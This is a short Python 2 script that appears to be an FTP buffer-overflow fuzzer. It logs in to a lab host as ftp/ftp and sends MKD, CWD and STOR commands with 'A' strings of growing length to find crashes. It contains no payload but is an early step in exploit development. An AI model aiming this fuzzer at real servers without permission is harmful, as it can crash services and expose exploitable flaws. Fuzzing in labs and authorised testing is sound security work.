# !/usr/bin/python
import socket

buffer = ["A"]
counter = 20

while len(buffer) <= 100:
	buffer.append("A" * counter)
	counter = counter + 20

commands = ["MKD", "CWD", "STOR"]

for command in commands:
	for string in buffer:
		print "Fon teste :" + command + ":" + str(len(string))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect(('10.0.0.2', 21))
		s.recv(1024)
		s.send('USER ftp\r\n')
		s.recv(1024)
		s.send('PASS ftp\r\n')
		s.recv(1024)
		s.send(command + ' ' + string + '\r\n')
		s.recv(1024)
		s.send('QUIT \r\n')
		s.close()
